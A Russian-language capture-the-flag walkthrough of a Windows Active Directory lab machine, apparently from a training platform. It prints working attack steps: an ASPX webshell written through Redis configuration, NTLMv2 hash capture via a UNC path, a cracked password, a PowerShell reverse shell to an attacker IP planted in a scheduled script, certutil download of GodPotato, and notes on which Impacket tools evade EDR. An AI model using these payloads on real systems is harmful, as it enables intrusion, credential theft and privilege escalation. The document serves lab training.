
# 🎯 VulnNet Active

| Характеристика | Значение |
| :--- | :--- |
| **ОС** | Windows Server 2019 |
| **Сложность** | Medium (Средняя) |
| **Среда** | Active Directory |
| **Ключевые векторы** | Unauthenticated Redis, NTLMv2 Hash Stealing, Hash Cracking, Scheduled Task Hijacking, `SeImpersonatePrivilege`, GodPotato |

---

## 1. Разведка (Reconnaissance)

Первым делом проводим сканирование открытых портов. Использование `RustScan` позволяет быстро найти открытые порты, после чего в дело вступает `Nmap` для определения версий и запуска стандартных скриптов.

```bash
rustscan -a 10.49.156.78 -- -sV -sC -A
```

**Анализ результатов сканирования:**

| Порт | Служба | Описание / Значение для пентестера |
| :--- | :--- | :--- |
| `53`, `88`, `135`, `139`, `445` | DNS, Kerberos, RPC, SMB | Стандартный набор портов для контроллера домена Active Directory (DC). |
| `464` | `kpasswd5` | Служба смены пароля Kerberos. Подтверждает наличие AD. |
| `9389` | `mc-nmf` | AD Web Services. Дополнительное подтверждение контроллера домена. |
| `6379` | `redis` | **Аномалия!** In-Memory база данных. Версия `2.8.2402`, работающая под Windows. |

> 💡 **Разведка SMB:** Попытка анонимного подключения по SMB (например, через `enum4linux-ng` или `smbmap`) возвращает ошибку `STATUS_LOGON_FAILURE`. Нулевая сессия (Null Session) отключена. Точкой входа становится Redis.

---

## 2. Первоначальный доступ (Initial Access)

### 2.1. Исследование Redis

Подключаемся к порту `6379` с помощью стандартного клиента `redis-cli` (или через `nc`). База пускает нас **без пароля** (Unauthenticated Access).

```bash
redis-cli -h 10.49.156.78
```

Полезные команды для базового сбора информации:
*   `INFO` — выводит системную информацию (версия ОС, версия Redis, архитектура).
*   `KEYS *` — показывает все ключи в текущей базе.
*   `GET <key>` — прочитать значение конкретного ключа.

> 📚 **Шпаргалка: Классический RCE через конфигурацию Redis**
> Если Redis запущен от root/SYSTEM и есть доступный веб-сервер, можно записать веб-шелл напрямую в директорию сайта:
> ```redis
> CONFIG SET dir "C:\inetpub\wwwroot"
> CONFIG SET dbfilename "shell.aspx"
> SET payload "<% Response.Write(eval(Request.Item[\"cmd\"])); %>"
> SAVE
> ```
> *В нашем случае веб-сервера (порты 80/443) нет, поэтому записать шелл некуда. Нужно искать другой путь.*

### 2.2. ❌ Кроличья нора №1: Обход песочницы Lua

Поскольку версия Redis довольно старая, логичной кажется попытка выполнить системные команды через встроенный движок Lua (команда `EVAL`).

```redis
10.49.156.78:6379> EVAL "return os.execute('ping -n 3 192.168.156.81')" 0
```
**Результат:**
`(error) ERR Error running script ... Script attempted to access unexisting global variable 'os'`

**Причина неудачи:** Разработчики включили режим `strict_lua`. Песочница активна, опасные модули (такие как `os` и `io`) удалены из глобального пространства имен. Обход песочницы в этой версии невозможен.

### 2.3. Вектор атаки: Кража NTLMv2 хэша через UNC-путь

В среде Windows любая служба, пытающаяся обратиться к сетевой папке (UNC-пути), автоматически пытается авторизоваться на ней, передавая NTLMv2-хэш учетной записи, от имени которой запущена служба.

**Шаг 1: Запуск прослушивателя Responder на машине атакующего**
`Responder` создаст поддельный SMB-сервер для перехвата аутентификации.
```bash
sudo responder -I tun0 -dwv
```

**Шаг 2: Принуждение Redis к подключению**
В консоли Redis заставляем сервер установить рабочую директорию на нашу машину:
```redis
10.49.156.78:6379> CONFIG SET dir "//192.168.156.81/share"
```
*Примечание: Вывод консоли может выдать `(error) ERR Changing directory: Permission denied`. Не обращайте внимания! Попытка подключения всё равно произошла до проверки прав на запись.*

**Шаг 3: Перехват и взлом**
Смотрим в окно `Responder` и видим пойманный хэш пользователя `enterprise-security`.
Копируем хэш в файл `hash.txt` и отдаем его **Hashcat**:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
---

## 3. Закрепление: Эксплуатация планировщика задач

С учетными данными на руках проверяем доступные SMB-шары (сетевые папки).

```bash
smbmap -H 10.49.156.78 -u "enterprise-security" -p "sand_0873959498"
```

| Имя шары | Права доступа | Описание |
| :--- | :--- | :--- |
| `ADMIN$` | NO ACCESS | Административная шара |
| `C$` | NO ACCESS | Диск C |
| `SYSVOL` | READ ONLY | Стандартная шара AD |
| `NETLOGON` | READ ONLY | Стандартная шара AD |
| **`Enterprise-Share`** | **READ, WRITE** | Пользовательская шара с правами на запись |

Заходим в шару `Enterprise-Share` через `smbclient`:
```bash
smbclient //10.49.156.78/Enterprise-Share -U "enterprise-security%sand_0873959498"
```
Внутри находим файл `PurgeIrrelevantData_1826.ps1`. Судя по названию и факту его существования в расшаренной папке, этот скрипт периодически выполняется планировщиком задач (Task Scheduler).

**Создание Reverse Shell:**
Генерируем PowerShell reverse shell.

```powershell
cat << 'EOF' > PurgeIrrelevantData_1826.ps1                                                        
$client = New-Object System.Net.Sockets.TCPClient("192.168.156.81",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF

# Сохраняем локально под именем PurgeIrrelevantData_1826.ps1
```

Запускаем листенер `nc -lvnp 4444` и подменяем файл на сервере:
```bash
smb: \> put PurgeIrrelevantData_1826.ps1
```

Через минуту планировщик срабатывает, и мы получаем сессию в Netcat от имени пользователя `enterprise-security`!

---

## 4. Повышение привилегий (Privilege Escalation)

Проверяем наши текущие привилегии в системе.

```powershell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

> 📚 **Справка: SeImpersonatePrivilege**
> Эта привилегия позволяет пользователю запускать процессы от имени другого клиента, который аутентифицировался у этого пользователя. Это классическая брешь в Windows (часто встречается у сервисных учеток IIS, SQL и т.д.), которая позволяет повысить права до `NT AUTHORITY\SYSTEM` с помощью уязвимостей семейства "Potato".

### 4.1. ❌ Кроличья нора №2: Мертвый PrintSpoofer

Стандартный выбор для Windows Server 2016/2019 с `SeImpersonate` — это `PrintSpoofer64.exe`.
Загружаем эксплойт на сервер (например, через `certutil`) и пытаемся запустить:

```powershell
.\PrintSpoofer64.exe -i -c cmd
```
**Результат:** Зависание или отсутствие вывода. Перенаправление вывода в файл (`-c "cmd /c whoami > C:\Temp\whoami.txt"`) тоже ничего не дает.

**Анализ причин:**
PrintSpoofer использует службу диспетчера печати (Print Spooler) для принуждения SYSTEM к аутентификации. Проверяем статус службы:
```powershell
PS C:\> Get-Service Spooler
Status   Name               DisplayName
------   ----               -----------
Stopped  Spooler            Print Spooler
```
После эпидемии уязвимостей "PrintNightmare" администраторы повсеместно стали отключать эту службу на серверах. PrintSpoofer здесь бесполезен.

### 4.2. ✅ Успешный вектор: GodPotato

Когда `Spooler` отключен, на помощь приходят современные аналоги, работающие через механизмы DCOM / RPC, например **GodPotato** или **RoguePotato**.

**Шаг 1: Загрузка эксплойта на целевую машину**
На своей машине запускаем Python HTTP-сервер (`python3 -m http.server 80`), а на целевой выполняем:
```powershell
certutil.exe -urlcache -split -f "http://192.168.156.81/GodPotato-NET4.exe" C:\Windows\Temp\GodPotato-NET4.exe
```

**Шаг 2: Изменение конфигурации ОС**
Вместо того чтобы пытаться прокинуть обратный шелл от SYSTEM (что иногда багует или блокируется антивирусами), используем эксплойт для надежного закрепления — **добавим нашего текущего пользователя в группу локальных администраторов**.

```powershell
cd C:\Windows\Temp\
.\GodPotato-NET4.exe -cmd "net localgroup Administrators enterprise-security /add"
```

Команда выполняется в контексте `SYSTEM`. Проверяем результат:
```powershell
net user enterprise-security
```
В выводе в разделе `Local Group Memberships` видим `*Administrators`. Мы получили полные права!

---

## 5. Сбор флагов (Post-Exploitation)

Поскольку наш пользователь `enterprise-security` теперь состоит в группе Администраторов, мы можем напрямую подключиться к серверу, минуя обратный шелл, используя инструменты пакета **Impacket**.

**Вариант 1: Интерактивный системный шелл через PsExec**
```bash
impacket-psexec vulnnet.local/enterprise-security:'sand_0873959498'@10.49.156.78
```
*Вы получите командную строку с правами `NT AUTHORITY\SYSTEM`.*

### 📚 Рейтинг "шумности" инструментов Impacket

| Инструмент | Уровень шума | Как работает | Реакция AV/EDR |
| :--- | :--- | :--- | :--- |
| `psexec.py` | 🔴 **Максимальный** | Дропает `.exe` на диск, создает службу. | 99% заблокируется Defender'ом/EDR. Оставит кучу следов. |
| `smbexec.py` | 🟠 **Высокий** | Не кидает `.exe` на диск, но **создает временную службу** для запуска `cmd.exe /c` с перенаправлением вывода. | Меньше шансов быть пойманным по сигнатуре файла, но Event ID 7045 (создание службы) всё равно выдаст вас. |
| `wmiexec.py` | 🟡 **Средний / Низкий** | Использует механизм WMI. Не создает службы, не дропает файлы. Запускает `cmd.exe` через процесс `WmiPrvSE.exe`. | **Золотой стандарт.** Гораздо тише, обходит базовые антивирусы, но продвинутые EDR могут заметить подозрительные команды от `WmiPrvSE.exe`. |

**Вариант 2: Забор флага через SMB (бесшумно)**
Подключаемся к административной скрытой шаре `C$`:
```bash
smbclient //10.49.156.78/C$ -U "enterprise-security%sand_0873959498"
```
Флаг пользователя `user.txt` можно аналогично забрать из `C:\Users\enterprise-security\Desktop\user.txt`.

**🎯 Машина пройдена (System Pwned)!**
